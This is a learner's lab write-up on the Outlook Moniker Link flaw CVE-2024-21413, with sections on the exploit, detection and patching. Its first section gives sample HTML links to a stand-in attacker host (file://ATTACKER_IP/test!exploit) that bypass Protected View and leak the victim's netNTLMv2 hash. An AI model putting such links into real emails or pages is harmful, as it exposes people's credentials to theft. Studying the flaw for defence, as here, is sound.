Room Title: Moniker Link (CVE-2024-21413)
Difficulty: Easy
Time to Complete: 30 minutes
Skills Covered:

    Moniker Link (CVE-2024-21413)
    Detection
    Remediation
    
🏛️ Key Concepts and Lessons Learned
🔹 Moniker Link (CVE-2024-21413)

     By using the file:// Moniker Link in our hyperlink, we can instruct Outlook to attempt to access a file, such as a file on a network share (<a href="file://ATTACKER_IP/test">Click me</a>). 
     The SMB protocol is used, which involves using local credentials for authentication. However, Outlook's "Protected View" catches and blocks this attempt.

    <p><a href="file://ATTACKER_MACHINE/test">Click me</a></p>

    The vulnerability here exists by modifying our hyperlink to include the ! special character and some text in our Moniker Link which results in bypassing Outlook’s Protected View. 
    For example: <a href="file://ATTACKER_IP/test!exploit">Click me</a>.

    <p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>

    We, as attackers, can provide a Moniker Link of this nature for the attack. 
    Note the share does not need to exist on the remote device, as an authentication attempt will be attempted regardless, leading to the victim's Windows netNTLMv2 hash being sent to the attacker.

🔹 Detection

    A Yara rule has been created by Florian Roth to detect emails containing the file:\\ element in the Moniker Link.  

    Wireshark

    Additionally, the SMB request from the victim to the client can be seen in a packet capture with a truncated netNTLMv2 hash.

🔹 Remediation

    Microsoft has included patches to resolve this vulnerability in February’s “patch Tuesday” release. You can see a list of KB articles by Office build here. Updating Office through Windows Update or the Microsoft Update Catalog is strongly recommended.

    Additionally, in the meantime, it is a timely reminder to practice general - safe - cyber security practices. For example, reminding users to:

    Do not click random links (especially from unsolicited emails)
    Preview links before clicking them
    Forward suspicious emails to the respective department responsible for cyber security
    

🔍 Reflection

This room helped me to know some more about how a vulnerability work, how to do exploitations and also how a simple vulnerability can be exploit by simple attackers.
